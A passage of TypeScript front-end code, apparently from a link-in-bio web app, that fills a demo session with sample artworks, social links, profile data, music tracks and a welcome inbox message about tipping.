        { id: 'a2', title: 'Matrix Core', url: 'https://images.unsplash.com/photo-1550751827-4bd374c3f58b?auto=format&fit=crop&q=80&w=800', likes: 88, dislikes: 2, favorites: 34, zaps: 8500 },
        { id: 'a3', title: 'Neon Horizon', url: 'https://images.unsplash.com/photo-1605142859862-978be7eba909?auto=format&fit=crop&q=80&w=800', likes: 256, dislikes: 0, favorites: 98, zaps: 42000 },
      ];
      const demoSession: UserSessionData = {
        links: [
          {id:'d1',title:'Twitter / X',url:'https://x.com',icon:'𝕏',clicks:10420,enabled:true,category:'Social',likes:45,dislikes:0,favorites:12,zaps:500},
          {id:'d2',title:'GitHub',url:'https://github.com',icon:'💻',clicks:8590,enabled:true,category:'Dev',likes:89,dislikes:0,favorites:25,zaps:1000},
          {id:'d3',title:'Discord',url:'https://discord.com/users/446415839931924490',icon:'🎮',clicks:5600,enabled:true,category:'Community',likes:34,dislikes:0,favorites:12,zaps:200}
        ],
        profile: {
          ...DEF_PROFILE,
          username:'demo',
          displayName: 'Demo Vault',
          isVerified:true,
          isAdmin:true,
          zbdGamerTag:'MrWhosHacking',
          theme:'bitcoin',
          badges: ['owner', 'dev', 'verified', 'vip'],
          music:[
            {id:'m1',title:'Phonk Matrix Protocol',url:'https://wavlake.com/track/06ee898c-c284-480f-b3aa-3c1127a292e1',platform:'wavelake',likes:1520,dislikes:0,favorites:420,zaps:25000},
            {id:'m2',title:'Drift Matrix Feed',url:'https://open.spotify.com/track/0eu4C55hL6x29mmeAjytzC?si=0d572c8a8e2e4116',platform:'spotify',likes:892,dislikes:2,favorites:340,zaps:42000}
          ],
          artworks:art,
          onboarded:true,
          chatMessages:[],
        },
        inbox: [{
          id: 'demo-welcome',
          senderName: 'SYSTEM',
          message: 'Welcome to the Live Demo! 🚀\n\n- Tipping is ACTIVE: You can actually send tips to test the system (anything is appreciated!)\n- Fully Customizable: Go to the Dashboard to change links, themes, and art.\n- 100% Free: Create your own official vault for free once you\'re ready!',
          timestamp: Date.now(),
          read: false,
          type: 'welcome'
        }],
        settings: DEF_SETTINGS,
        analytics: DEF_ANALYTICS,
      };
      setLinksS(demoSession.links);
      setProfileS(demoSession.profile);
      setInboxS(demoSession.inbox);
      setSettingsS(demoSession.settings);
      setAnalyticsS(demoSession.analytics);
      setCU('demo-user');
    }
  };
}
